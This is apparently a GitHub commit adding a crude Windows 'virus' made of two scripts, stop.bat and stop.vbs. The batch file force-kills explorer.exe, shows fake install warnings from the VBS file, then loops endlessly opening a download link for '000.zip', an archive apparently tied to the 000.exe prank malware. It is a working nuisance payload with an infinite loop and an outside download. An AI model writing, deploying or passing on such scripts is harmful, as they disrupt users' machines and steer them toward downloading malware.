471a36ae39213e64836eb6cd209290f7d722e460
Iasonas6220 <147349489+Iasonas6220@users.noreply.github.com>
2024-02-03 17:11:10 +0100

    Add files via upload

---
+++ virus/stop.bat
@@ -0,0 +1,10 @@
+@echo off
+taskkill /f /im explorer.exe
+start stop.vbs
+timeout /t 20
+color 4
+titlt virus setup
+echo hahahha
+a:
+start https://github.com/FlyTechVideos/000exe/releases/download/1.0/000.zip
+goto a
---
+++ virus/stop.vbs
@@ -0,0 +1,3 @@
+x=msgbox("000.exe install", 64+0, "virus install")
+x=msgbox("000.exe install", 16+5, "no install 000.exe")
+x=msgbox("no install", 48+3, "stop")
